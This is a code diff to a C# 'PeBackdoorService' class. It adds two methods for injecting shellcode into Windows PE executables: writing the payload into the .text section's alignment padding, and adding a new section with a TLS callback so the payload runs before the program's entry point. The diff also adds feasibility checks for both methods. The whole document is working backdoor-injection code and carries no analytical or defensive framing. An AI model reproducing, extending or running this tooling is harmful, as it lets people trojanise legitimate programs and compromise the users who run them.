@@ -304,8 +304,15 @@ public sealed class PeBackdoorService
                     (peData, payloadRva) = InjectSectionExtension(peData, pe, fullPayload, result);
                     pe = ParsePe(peData);
                     break;
+                case InjectionMethod.TextSectionPadding:
+                    (peData, payloadRva) = InjectTextSectionPadding(peData, pe, fullPayload, result);
+                    break;
+                case InjectionMethod.TlsCallback:
+                    (peData, payloadRva) = InjectViaTlsCallback(peData, pe, fullPayload, options.NewSectionName, result);
+                    pe = ParsePe(peData);
+                    break;
                 default:
-                    result.ErrorMessage = $"Injection method {options.Method} is not yet implemented";
+                    result.ErrorMessage = $"Injection method {options.Method} is not supported";
                     return result;
             }
 
@@ -1182,6 +1189,162 @@ public sealed class PeBackdoorService
         return (output, payloadRva);
     }
 
+    private (byte[] data, uint payloadRva) InjectTextSectionPadding(byte[] peData, ParsedPe pe,
+        byte[] payload, BackdoorResult result)
+    {
+        // Find the .text section (primary code section)
+        var textSection = pe.Sections.FirstOrDefault(s =>
+            s.Name.Equals(".text", StringComparison.OrdinalIgnoreCase))
+            ?? pe.Sections.FirstOrDefault(s => s.IsExecutable);
+
+        if (textSection == null)
+            throw new InvalidOperationException("No .text or executable section found in the PE");
+
+        // The padding gap is the space between VirtualSize and RawSize (file alignment padding).
+        // Compilers often allocate RawSize > VirtualSize due to FileAlignment rounding.
+        uint paddingStart = textSection.VirtualSize;
+        uint paddingCapacity = textSection.RawSize > textSection.VirtualSize
+            ? textSection.RawSize - textSection.VirtualSize
+            : 0;
+
+        if (paddingCapacity < (uint)payload.Length)
+        {
+            throw new InvalidOperationException(
+                $"Text section padding too small: {paddingCapacity} bytes available, " +
+                $"need {payload.Length}. Try --method new-section or section-ext.");
+        }
+
+        // Write payload into the padding area
+        uint fileOffset = textSection.RawAddress + paddingStart;
+        uint payloadRva = textSection.VirtualAddress + paddingStart;
+
+        var output = peData.ToArray();
+        Array.Copy(payload, 0, output, fileOffset, payload.Length);
+
+        // Expand VirtualSize to cover the payload so the loader maps it into memory
+        uint newVirtSize = paddingStart + (uint)payload.Length;
+        BitConverter.GetBytes(newVirtSize).CopyTo(output, textSection.HeaderFileOffset + 8);
+
+        // Ensure the section is executable + readable (it should be, but be safe)
+        uint requiredFlags = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;
+        if ((textSection.Characteristics & requiredFlags) != requiredFlags)
+        {
+            uint newChars = (textSection.Characteristics & ~IMAGE_SCN_MEM_DISCARDABLE) | requiredFlags;
+            BitConverter.GetBytes(newChars).CopyTo(output, textSection.HeaderFileOffset + 36);
+        }
+
+        result.Steps.Add($"Wrote {payload.Length} bytes into {textSection.Name} padding at RVA 0x{payloadRva:X} (gap: {paddingCapacity} bytes)");
+        return (output, payloadRva);
+    }
+
+    private (byte[] data, uint payloadRva) InjectViaTlsCallback(byte[] peData, ParsedPe pe,
+        byte[] payload, string sectionName, BackdoorResult result)
+    {
+        if (!pe.Is64Bit)
+            throw new InvalidOperationException("TLS callback injection is only supported for x64 PE files");
+
+        uint fileAlign = pe.FileAlignment;
+        uint sectAlign = pe.SectionAlignment;
+
+        // ── Step 1: Add a new section that holds: [TLS directory] [callback array] [payload]
+        long newHeaderOffset = pe.SectionHeadersFileOffset + pe.NumberOfSections * 40;
+        long headerEnd = newHeaderOffset + 40;
+        if (headerEnd > pe.SizeOfHeaders)
+        {
+            throw new InvalidOperationException(
+                $"No room for new section header (headers end at 0x{pe.SizeOfHeaders:X}, " +
+                $"need 0x{headerEnd:X}). Try --method new-section.");
+        }
+
+        var lastSect = pe.Sections.Last();
+        uint newRva = AlignUp(lastSect.VirtualAddress + Math.Max(lastSect.VirtualSize, lastSect.RawSize), sectAlign);
+
+        // Layout within the new section:
+        //   [0x00..0x27]  IMAGE_TLS_DIRECTORY64 (40 bytes)
+        //   [0x28..0x37]  Callback array: [ptr_to_payload, NULL] (16 bytes)
+        //   [0x38..]      Payload bytes
+        const int TLS_DIR_SIZE = 40;
+        const int CALLBACK_ARRAY_SIZE = 16; // 2 × 8-byte pointers (callback + null terminator)
+        int headerArea = TLS_DIR_SIZE + CALLBACK_ARRAY_SIZE;
+        int totalSize = headerArea + payload.Length;
+
+        uint rawSize = AlignUp((uint)totalSize, fileAlign);
+        uint rawOffset = AlignUp(lastSect.RawAddress + lastSect.RawSize, fileAlign);
+
+        // Extend file
+        int newFileSize = Math.Max(peData.Length, (int)(rawOffset + rawSize));
+        var output = new byte[newFileSize];
+        Array.Copy(peData, 0, output, 0, peData.Length);
+
+        // RVAs for the structures
+        uint tlsDirRva = newRva;
+        uint callbackArrayRva = newRva + TLS_DIR_SIZE;
+        uint payloadRva = newRva + (uint)headerArea;
+        ulong payloadVa = pe.ImageBase + payloadRva;
+        ulong callbackArrayVa = pe.ImageBase + callbackArrayRva;
+
+        // ── Step 2: Write the IMAGE_TLS_DIRECTORY64
+        using (var ms = new MemoryStream(output))
+        {
+            ms.Seek(rawOffset, SeekOrigin.Begin);
+            using var bw = new BinaryWriter(ms);
+
+            bw.Write((ulong)0);           // StartAddressOfRawData
+            bw.Write((ulong)0);           // EndAddressOfRawData
+            bw.Write((ulong)0);           // AddressOfIndex
+            bw.Write(callbackArrayVa);    // AddressOfCallBacks (VA of callback array)
+            bw.Write((uint)0);            // SizeOfZeroFill
+            bw.Write((uint)0);            // Characteristics
+        }
+
+        // ── Step 3: Write the callback array [payload_va, 0]
+        BitConverter.GetBytes(payloadVa).CopyTo(output, rawOffset + TLS_DIR_SIZE);
+        BitConverter.GetBytes((ulong)0).CopyTo(output, rawOffset + TLS_DIR_SIZE + 8);
+
+        // ── Step 4: Write the payload
+        Array.Copy(payload, 0, output, rawOffset + headerArea, payload.Length);
+
+        // ── Step 5: Update NumberOfSections
+        ushort newCount = (ushort)(pe.NumberOfSections + 1);
+        BitConverter.GetBytes(newCount).CopyTo(output, pe.NumberOfSectionsFileOffset);
+
+        // ── Step 6: Update SizeOfImage
+        uint newSizeOfImage = AlignUp(newRva + (uint)totalSize, sectAlign);
+        BitConverter.GetBytes(newSizeOfImage).CopyTo(output, pe.SizeOfImageFieldFileOffset);
+
+        // ── Step 7: Write the new section header
+        string tlsSectionName = sectionName.Length <= 8 ? sectionName : sectionName[..8];
+        using (var ms = new MemoryStream(output))
+        {
+            ms.Seek(newHeaderOffset, SeekOrigin.Begin);
+            using var bw = new BinaryWriter(ms);
+
+            var nameBytes = new byte[8];
+            Encoding.ASCII.GetBytes(tlsSectionName, 0, Math.Min(tlsSectionName.Length, 8), nameBytes, 0);
+            bw.Write(nameBytes);
+            bw.Write((uint)totalSize);       // VirtualSize
+            bw.Write(newRva);                // VirtualAddress
+            bw.Write(rawSize);               // SizeOfRawData
+            bw.Write(rawOffset);             // PointerToRawData
+            bw.Write(0u);                    // PointerToRelocations
+            bw.Write(0u);                    // PointerToLinenumbers
+            bw.Write((ushort)0);             // NumberOfRelocations
+            bw.Write((ushort)0);             // NumberOfLinenumbers
+            bw.Write(IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE);
+        }
+
+        // ── Step 8: Patch the TLS data directory (index 9) to point to our TLS directory
+        //   PE32+: data dirs start at optHeader + 112; TLS = index 9 → offset + 112 + 9*8 = optHeader + 184
+        long optHeaderOffset = pe.PeOffset + 4 + 20; // skip signature + file header
+        long tlsDataDirOffset = optHeaderOffset + (pe.Is64Bit ? 184 : 168);
+        BitConverter.GetBytes(tlsDirRva).CopyTo(output, tlsDataDirOffset);
+        BitConverter.GetBytes((uint)TLS_DIR_SIZE).CopyTo(output, tlsDataDirOffset + 4);
+
+        result.Steps.Add($"Added TLS section '{tlsSectionName}' at RVA 0x{newRva:X} (raw 0x{rawOffset:X})");
+        result.Steps.Add($"TLS callback → payload at VA 0x{payloadVa:X} (RVA 0x{payloadRva:X})");
+        return (output, payloadRva);
+    }
+
     // ═════════════════════════════════════════════════════════════════════
     //  Header Patching Helpers
     // ═════════════════════════════════════════════════════════════════════
@@ -1400,6 +1563,28 @@ public sealed class PeBackdoorService
                 s.RawSize > 0 && s.RawSize >= (uint)shellcode.Length + 100);
             if (!hasCaves)
                 issues.Add("No section appears large enough for code cave injection — consider --method new-section");
+        }
+
+        if (options.Method == InjectionMethod.TextSectionPadding)
+        {
+            var textSection = pe.Sections.FirstOrDefault(s =>
+                s.Name.Equals(".text", StringComparison.OrdinalIgnoreCase))
+                ?? pe.Sections.FirstOrDefault(s => s.IsExecutable);
+            if (textSection == null)
+                issues.Add("BLOCK: No .text or executable section found for text-padding injection");
+            else
+            {
+                uint gap = textSection.RawSize > textSection.VirtualSize
+                    ? textSection.RawSize - textSection.VirtualSize : 0;
+                if (gap < (uint)shellcode.Length + 100)
+                    issues.Add($"Text section padding may be too small ({gap} bytes) for {shellcode.Length + 100} byte payload — consider --method new-section");
+            }
+        }
+
+        if (options.Method == InjectionMethod.TlsCallback)
+        {
+            if (!pe.Is64Bit)
+                issues.Add("BLOCK: TLS callback injection is only supported for x64 PE files");
         }
 
         return issues;
